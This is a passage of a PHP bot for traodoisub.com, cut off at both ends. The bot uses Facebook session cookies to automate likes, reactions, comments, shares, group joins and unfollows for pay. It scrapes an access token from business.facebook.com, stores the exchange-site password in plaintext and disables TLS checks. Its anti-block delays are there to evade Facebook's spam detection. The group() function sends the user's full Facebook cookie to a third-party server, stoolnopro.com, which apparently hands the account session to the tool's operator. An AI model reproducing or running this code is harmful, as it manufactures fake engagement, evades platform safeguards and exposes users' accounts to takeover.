 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://traodoisub.com/ex/' . $loai . '/load.php',
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIEFILE => "TDS.txt",
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 $a = curl_exec($ch);
 curl_close($ch);
 return $a;
}
function nhantien($tp, $loai, $id)
{
 $url  = "https://traodoisub.com/ex/" . $loai . "/nhantien.php";
 $data = "id=" . $id . "&type=" . $tp;
 $head = array(
  "Host: traodoisub.com",
  "content-length: " . strlen($data),
  "accept: */*",
  "origin: https://traodoisub.com",
  "x-requested-with: XMLHttpRequest",
  "user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
  "content-type: application/x-www-form-urlencoded; charset=UTF-8",
  "referer: https://traodoisub.com/ex/" . $loai . "/"
 );

 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $url,
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIEFILE => "TDS.txt",
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 $a = curl_exec($ch);
 curl_close($ch);
 return $a;
}
function share($id, $cookie)
{
 $url  = "https://mbasic.facebook.com/" . $id . "";
 $head = array(
  "Host: mbasic.facebook.com",
  "upgrade-insecure-requests: 1",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*" . "/" . "*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: navigate",
  "sec-fetch-user: ?1",
  "sec-fetch-dest: document",
  "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $url,
  CURLOPT_FOLLOWLOCATION => false,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_HEADER => true,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_ENCODING => TRUE
 ));
 $data = curl_exec($ch);
 if (strpos($data, "xs=deleted") == true) {
  print "\033[1;31mCookie Die !!!!\n";
  exit();
 }

 $one = explode("location: ", $data);
 $two = explode("rdr", $one[1]);
 $url = $two[0] . "rdr";
 if ($url == 'rdr') {
 } else {
  curl_setopt_array($ch, array(
   CURLOPT_URL => $url,
   CURLOPT_FOLLOWLOCATION => false,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_POST => 1,
   CURLOPT_HTTPGET => true,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_HTTPHEADER => $head,
   CURLOPT_HEADER => true,
   CURLOPT_ENCODING => TRUE
  ));
  $a = curl_exec($ch);
  curl_close($ch);
  $data   = explode('"', explode('<a href="/composer/mbasic/?c_src=share&amp;', $a)[1])[0];
  $l1 = explode('amp;', $data)[0];
  $l2 = explode('amp;', $data)[1];
  $l3 = explode('amp;', $data)[2];
  $l4 = explode('amp;', $data)[3];
  $l5 = explode('amp;', $data)[4];
  $l6 = explode('amp;', $data)[5];
  $l7 = explode('amp;', $data)[6];
  $l8 = explode('amp;', $data)[7];
  $l9 = explode('amp;', $data)[8];
  $l10 = explode('amp;', $data)[9];
  $l11 = explode('amp;', $data)[10];
  $link = "https://mbasic.facebook.com/composer/mbasic/?c_src=share&" . $l1 . "" . $l2 . "" . $l3 . "" . $l4 . "" . $l5 . "" . $l6 . "" . $l7 . "" . $l8 . "" . $l9 . "" . $l10 . "" . $l11 . "";
 }
 #begin
 $head = array(
  "Host: mbasic.facebook.com",
  "cache-control: max-age=0",
  "save-data: on",
  "upgrade-insecure-requests: 1",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "referer: https://mbasic.facebook.com/home.php",
  "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "sec-fetch-site: none",
  "sec-fetch-mode: navigate",
  "sec-fetch-user: ?1",
  "sec-fetch-dest: document"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $link,
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 $data = curl_exec($ch);
 curl_close($ch);
 $a   = explode('" id="composer_form"', explode('<form method="post" action="', $data)[1])[0];
 $a1 = explode('amp;', $a)[0];
 $a2 = explode('amp;', $a)[1];
 $a3 = explode('amp;', $a)[2];
 $a4 = explode('amp;', $a)[3];
 $link2 = "https://mbasic.facebook.com" . $a1 . "" . $a2 . "" . $a3 . "" . $a4 . "&ref=dbl";
 $fb_dtsg   = explode('" autocomplete="off"', explode('name="fb_dtsg" value="', $data)[1])[0];
 $jazoest   = explode('" autocomplete="off"', explode('name="jazoest" value="', $data)[1])[0];
 $target   = explode('"', explode('name="target" value="', $data)[1])[0];
 $csid   = explode('"', explode('name="csid" value="', $data)[1])[0];
 $privacyx   = explode('"', explode('name="privacyx" value="', $data)[1])[0];
 $cver   = explode('"', explode('name="cver" value="', $data)[1])[0];
 $m   = explode('"', explode('name="m" value="', $data)[1])[0];
 $shared_from_post_id   = explode('"', explode('name="shared_from_post_id" value="', $data)[1])[0];
 $cscr   = explode('"', explode('name="c_src" value="', $data)[1])[0];
 $referrer   = explode('"', explode('name="referrer" value="', $data)[1])[0];
 $ctype   = explode('"', explode('name="ctype" value="', $data)[1])[0];
 $sid   = explode('"', explode('name="sid" value="', $data)[1])[0];
 $waterfall_source   = explode('"', explode('name="waterfall_source" value="', $data)[1])[0];

 date_default_timezone_set('Asia/Ho_Chi_Minh');
 $t = date('d-m-Y | H:i:s');
 $data = "comment=Tool By Khôi Zalo 0377205462&m=oneclick&privacyx=" . $privacyx . "&sid=" . $sid . "&shareID=" . $sid . "&fs=1&fr=null&internal_preview_image_id=null&should_share_post=false&direct=true&_ft_=" . $l11 . "&fb_dtsg=" . $fb_dtsg . "&jazoest=" . $jazoest . "__dyn=1KQEGiFo525Ujwh8-F42mml3onxG6UO3m2i5UfXwNwTwKwSwMxWUW16wZxm6Uhx6485-0SUhxm3O0AE8o11E52q3q5U2nweS787S78K1Jwt8-0lm68WUS2F0EU6i12wm8qwk888C0NEeo5Wq3q0H8-7E2swp82vwAwmE2ewnE2Lw5dw&__csr=&__req=7&__a=AYmQRaSRpckx8Ugg8YkSOfYUUczZWHGSt_e3GRCVZ-yzwoxI0JMFbt_4bf2bG-XPk4FOLrTs5QEGOofdlpo6f5hUReNVHgYej0SSg1hYsLZoMQ&__user=" . $target . "";
 $header = array(
  "Host: m.facebook.com",
  "content-length: " . strlen($data),
  "origin: https://m.facebook.com",
  "x-requested-with: XMLHttpRequest",
  "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36",
  "x-response-format: JSONStream",
  "content-type: application/x-www-form-urlencoded",
  "accept: */*",
  "referer: https://m.facebook.com/"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://m.facebook.com/a/sharer.php',
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 $data = curl_exec($ch);
 curl_close($ch);
}

function group($id, $cookie)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://stoolnopro.com/admin/api/group.php?id=' . $id . '&cookie=' . $cookie);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
 $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
 $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
 curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 $send = json_decode(curl_exec($ch), true);
 curl_close($ch);
 return $send;
}

function joingroup($id, $cookie)
{
 $url  = "https://mbasic.facebook.com/groups/" . $id . "";
 $head = array(
  "Host: mbasic.facebook.com",
  "upgrade-insecure-requests: 1",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*" . "/" . "*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: navigate",
  "sec-fetch-user: ?1",
  "sec-fetch-dest: document",
  "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $url,
  CURLOPT_FOLLOWLOCATION => false,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_HEADER => true,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_ENCODING => TRUE
 ));
 $a = curl_exec($ch);
 if (strpos($a, "xs=deleted") == true) {
  print "\033[1;31m Cookie Die\n";
  exit();
 }
 $data   = explode('"', explode('/a/group/join/', $a)[1])[0];
 $l1 = explode('amp;', $data)[0];
 $l2 = explode('amp;', $data)[1];
 $l3 = explode('amp;', $data)[2];
 $fb_dtsg   = explode('" autocomplete="off"', explode('name="fb_dtsg" value="', $a)[1])[0];
 $jazoest   = explode('" autocomplete="off"', explode('name="jazoest" value="', $a)[1])[0];

 $link = "https://mbasic.facebook.com/a/group/join/" . $l1 . "" . $l2 . "" . $l3 . "";
 if ($link == 'https://mbasic.facebook.com/a/group/join/') {
 } else {
  $data = "fb_dtsg=" . $fb_dtsg . "&jazoest=" . $jazoest . "";
  $header = array(
   "Host: mbasic.facebook.com",
   "content-length: " . strlen($data),
   "cache-control: max-age=0",
   "origin: https://mbasic.facebook.com",
   "upgrade-insecure-requests: 1",
   "content-type: application/x-www-form-urlencoded",
   "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36",
   "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
   "referer: " . $url . ""
  );
  $ch   = curl_init();
  curl_setopt_array($ch, array(
   CURLOPT_URL => $link,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $data,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_COOKIE => $cookie,
   CURLOPT_HTTPHEADER => $header,
   CURLOPT_ENCODING => TRUE,
   CURLOPT_FOLLOWLOCATION => true
  ));
  $cc = curl_exec($ch);
  $location = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
  curl_close($ch);
 }
 return $location;
}

function reaction_cmt($id, $idfb, $type, $cookie)
{
 $url  = "https://mbasic.facebook.com/" . $id . "";
 $head = array(
  "Host: mbasic.facebook.com",
  "upgrade-insecure-requests: 1",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*" . "/" . "*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: navigate",
  "sec-fetch-user: ?1",
  "sec-fetch-dest: document",
  "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $url,
  CURLOPT_FOLLOWLOCATION => false,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_HEADER => true,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_ENCODING => TRUE
 ));
 $data = curl_exec($ch);
 $one = explode("location: ", $data);
 $two = explode("rdr", $one[1]);
 $url = $two[0] . "rdr";
 if ($url == 'rdr') {
 } else {
  $idpost = explode('&id=', $url)[0];
  $idvictim = explode('&id=', $url)[1];
  curl_close($ch);
  if (strpos($data, "xs=deleted") == true) {
  }
  $head = array(
   "Host: mbasic.facebook.com",
   "cache-control: max-age=0",
   "sec-ch-ua-mobile: ?1",
   "save-data: on",
   "upgrade-insecure-requests: 1",
   "user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
   "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "sec-fetch-site: none",
   "sec-fetch-mode: navigate",
   "sec-fetch-user: ?1",
   "sec-fetch-dest: document"
  );
  $ch   = curl_init();
  curl_setopt_array($ch, array(
   CURLOPT_URL => 'https://mbasic.facebook.com/reactions/picker/?ft_id=' . $id . '&origin_uri=https://mbasic.facebook.com/' . $idvictim . '/posts/' . $idpost . '/?app=fbl&fbt_id=' . $id . '&lul&av=' . $idfb . '&__tn__=R',
   CURLOPT_FOLLOWLOCATION => false,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_POST => 1,
   CURLOPT_HTTPGET => true,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_HTTPHEADER => $head,
   CURLOPT_HEADER => true,
   CURLOPT_COOKIE => $cookie,
   CURLOPT_ENCODING => TRUE
  ));
  $cx = curl_exec($ch);
  $haha = explode('<a href="', $cx);
  if ($type == 'LOVE') {
   $haha2 = explode('" style="display:block"', $haha[2])[0];
  } else if ($type == 'CARE') {
   $haha2 = explode('" style="display:block"', $haha[3])[0];
  } else if ($type == 'HAHA') {
   $haha2 = explode('" style="display:block"', $haha[4])[0];
  } else if ($type == 'WOW') {
   $haha2 = explode('" style="display:block"', $haha[5])[0];
  } else if ($type == 'SAD') {
   $haha2 = explode('" style="display:block"', $haha[6])[0];
  } else {
   $haha2 = explode('" style="display:block"', $haha[7])[0];
  }
  if ($type == 'LIKE') {
   $data   = explode('"', explode('<a href="/ufi/reaction/?ft_ent_identifier=', $cx)[1])[0];
   curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/ufi/reaction/?ft_ent_identifier=' . htmlspecialchars_decode($data));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_exec($ch);
   curl_close($ch);
  } else {
   $link2 = html_entity_decode($haha2);
   curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   $x = curl_exec($ch);
   $location = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
   curl_close($ch);
  }
 }
 return $location;
}
function loadtime($loai)
{
 $so = 0;
 $delay = $_SESSION['' . $loai . ''];
 for($tt = $delay ;$tt>= 1;$tt--){
echo "Làm Nhiệm vụ sau $tt               \r"; sleep(1);
}}

function chongbl($loai) {
 for ($x = $_SESSION['' . $loai . '']; $x--; $x) {
  echo "\r\033[1;97m Đang hoạt động chống block sẽ chạy lại sau $x giây"; sleep(1); echo "\r    \r"; 
}}

function gettoken($cookie, $useragent)
{
 $head = array("Connection: keep-alive", "Keep-Alive: 300", "authority: business.facebook.com", "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "cache-control: max-age=0", "upgrade-insecure-requests: 1", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-site: none", "sec-fetch-mode: navigate", "sec-fetch-user: ?1", "sec-fetch-dest: document");
 $ch = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => "https://business.facebook.com/business_locations",
  CURLOPT_USERAGENT => $useragent,
  CURLOPT_COOKIE => $cookie,
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_SSL_VERIFYPEER => FALSE,
  CURLOPT_TIMEOUT => 60,
  CURLOPT_CONNECTTIMEOUT => 60,
  CURLOPT_FOLLOWLOCATION => TRUE
 ));
 $access = curl_exec($ch);
 curl_close($ch);
 $access_token = 'EAAG' . explode('","', explode('EAAG', $access)[1])[0];
 if (strlen($access_token) > 5) {
  return $access_token;
 } else {
  return 'die';
 }
}
function getxu()
{
 $url = "https://traodoisub.com/scr/user.php";
 $head = array(
  "Host: traodoisub.com",
  "accept: application/json, text/javascript, */*; q=0.01",
  "x-requested-with: XMLHttpRequest",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: cors",
  "sec-fetch-dest: empty",
  "referer: https://traodoisub.com/home/"
 );
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => $url,
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_HTTPGET => true,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIEFILE => "TDS.txt",
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 $data = curl_exec($ch);
 curl_close($ch);
 $json = json_decode($data, true);
 $sodu = $json["xu"];
 return $sodu;
}

function huyfollow($id, $useragent, $cookie)
{
 $ch = curl_init();
 if (strpos($id, '_')) {
  $uid = explode('_', $id, 2);
  $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
 } else {
  $id2 = $id;
 }

 $header = array(
  "Host:mbasic.facebook.com",
  "user-agent:$useragent",
  "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "cookie:$cookie",
 );
 
 $linkbv = 'https://mbasic.facebook.com/' . $id2;
 curl_setopt($ch, CURLOPT_URL, $linkbv);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
  :'));
 // json_decode(curl_exec($ch), true);
 $post = curl_exec($ch);

 
 $link = explode('<a href="/a/subscriptions/remove?subject_id=', $post)[1];
 $link = explode('"', $link)[0];
 $link = html_entity_decode($link);
 $link = "https://mbasic.facebook.com/a/subscriptions/remove?subject_id=".$link;
 // echo $link;
 // die();
 $linkreac1 = $link;
 $header = array(
  "Host:mbasic.facebook.com",
  "user-agent:$useragent",
  "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "referer:$linkbv",
  "cookie:$cookie",
 );
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $linkreac1);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
 $page = curl_exec($ch);
 $aa = $page;
 
 return $aa;
}
function cmt_fb_cookie_new($id,$cookie,$msg){
$mr = curl_init();
$head = [
	"Host:mbasic.facebook.com",
	'sec-ch-ua:"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
	"sec-ch-ua-mobile:?1",
	"cache-control:max-age=0",
	"upgrade-insecure-requests:1",
	"dnt:1",
	"save-data:on",
	"user-agent:Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
	"accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"sec-fetch-site:same-origin",
	"sec-fetch-mode:navigate",
	"sec-fetch-user:?1",
	"sec-fetch-dest:document",
	"referer:https://mbasic.facebook.com/",
	"accept-language:vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",];
curl_setopt($mr, CURLOPT_URL, "https://mbasic.facebook.com/$id");
curl_setopt($mr, CURLOPT_COOKIE, $cookie);
curl_setopt($mr, CURLOPT_HTTPHEADER, $head);
curl_setopt($mr, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($mr, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($mr, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($mr, CURLOPT_FOLLOWLOCATION, TRUE);
$mr2 = curl_exec($mr);
$fb_dtsg = explode('"',explode('fb_dtsg" value="',$mr2)[1])[0];
$jazoest = explode('"',explode('jazoest" value="',$mr2)[1])[0];
$cmt = explode('"',explode('action="/a/comment.php?',$mr2)[1])[0];
$text = "fb_dtsg=".$fb_dtsg."&jazoest=".$jazoest."&comment_text=".$msg;
curl_setopt($mr, CURLOPT_URL, "https://mbasic.facebook.com/a/comment.php?".htmlspecialchars_decode($cmt));
curl_setopt($mr, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($mr, CURLOPT_POSTFIELDS, $text);
$mr2 = curl_exec($mr);
curl_close($mr);
}
function login() {
 $DATA = http_build_query(
  array(
   "username" => $_SESSION["username"],
   "password" => $_SESSION['password'],
  )
 );
 $ch = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => "https://traodoisub.com/scr/login.php",
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_POSTFIELDS => $DATA,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIEJAR => "TDS.txt",
  CURLOPT_COOKIEFILE => "TDS.txt",
  CURLOPT_HTTPHEADER => 
   array(
 "Host:traodoisub.com",
 "content-length:".strlen($DATA),
 "accept:application/json, text/javascript, */*; q=0.01",
 "x-requested-with:XMLHttpRequest",
 "user-agent:".$_SESSION['useragent'],
 "content-type:application/x-www-form-urlencoded; charset=UTF-8",
   ),
  CURLOPT_ENCODING => TRUE
 ));
 $login = json_decode(curl_exec($ch), true);
 if ($login["success"] == "true") {
file_put_contents($_SESSION["username"].".txt", file_get_contents("TDS.txt"));
return true;
} else {
return false;
}
}
  
  
$trang = "\033[1;37m";
$_SESSION["C_LIKE"]   = " LIKE ";
$_SESSION["C_LIKE2"]  = "LIKE 2";
$_SESSION["C_CMT"] = " CMT ";
$_SESSION["C_FOLLOW"] = "FOLLOW";
$_SESSION["C_SHARE"]  = "SHARE ";
$_SESSION["C_PAGE"]   = " PAGE ";
$_SESSION["C_CXCMT"]  = "CX CMT";
$_SESSION["C_LOVE"]   = " LOVE ";
$_SESSION["C_CARE"]   = " CARE ";
$_SESSION["C_HAHA"]   = " HAHA ";
$_SESSION["C_WOW"] = " WOW  ";
$_SESSION["C_SAD"] = " SAD  ";
$_SESSION["C_ANGRY"]  = "ANGRY ";
$_SESSION["C_GROUP"]  = "GROUP ";

$_SESSION['useragent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36';
$thanh_xau = $icon1;
$thanh_dep = $icon2;
$thanhngang = $whiteb. "────────────────────────────────────────────────────────────\n";
$thanhngang1 = $whiteb."────────────────────────────────────────────────────────────\n";
$daucau = $icon1;
$daucauc = $icon2;

$useragent = "Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36";
@system('clear');
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
 @system('clear'); 
} else { 
 @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
$listnv = [];


while (true){
if (file_exists("TaiKhoanTDS.txt")){
$data = fread(fopen("TaiKhoanTDS.txt", "r"), filesize("TaiKhoanTDS.txt"));
if ($data == "") { unlink("TaiKhoanTDS.txt"); continue; }
$_SESSION["username"] = explode("|",$data)[0];
$_SESSION['password'] = explode("|",$data)[1];
$login = login();
if ($login == false) { unlink("TaiKhoanTDS.txt"); continue; }
echo $icon1."Bạn có muốn dùng lại tài khoản tds? (Y/N)\n".$icon2;
$chon_tk = trim(fgets(STDIN));
 if ($chon_tk == "n" or $chon_tk == "N") {
  unlink("TaiKhoanTDS.txt");
	} else if ($chon_tk == "y" or $chon_tk == "Y") {
 } else {
		echo $do." Lựa chọn sai\n"; 
		  continue;
 }
}
$file_luu_ck_fb = "CookieFbToolKhoi.txt";
if (!file_exists("TaiKhoanTDS.txt")){
echo $thanh_dep."\033[1;32mNhập Tài Khoản TDS: \033[1;33m"; $tk = trim(fgets(STDIN));
echo $thanh_dep."\033[1;32mNhập Mật Khẩu TDS: \033[1;33m"; $mk = trim(fgets(STDIN));
$file = fopen("TaiKhoanTDS.txt", "w+");
fwrite($file, $tk."|".$mk);
fclose($file);
}
$data = fread(fopen("TaiKhoanTDS.txt", "r"), filesize("TaiKhoanTDS.txt"));
$_SESSION["username"] = explode("|",$data)[0];
$_SESSION['password'] = explode("|",$data)[1];
$login = login();

if ($login == true) {
break;
} else {
echo $do." Đăng Nhập Thất Bại.\n";
unlink("TaiKhoanTDS.txt");
unlink($_SESSION["username"].".txt");
}
}

$khoToken = [];
if (file_exists($file_luu_ck_fb)){
  echo $icon1."Bạn có muốn dùng lại cookie Fb cũ? (Y/N)\n$icon2";
  $ckfbcu = (string)trim(fgets(STDIN));
}
else {$ckfbcu = "n";}
if ($ckfbcu == "y" or $ckfbcu == "Y"){
  for ($a = 0; $time < 99999999999; $time++) {
$file_ckfb = fread(fopen($file_luu_ck_fb, "r"), filesize($file_luu_ck_fb));
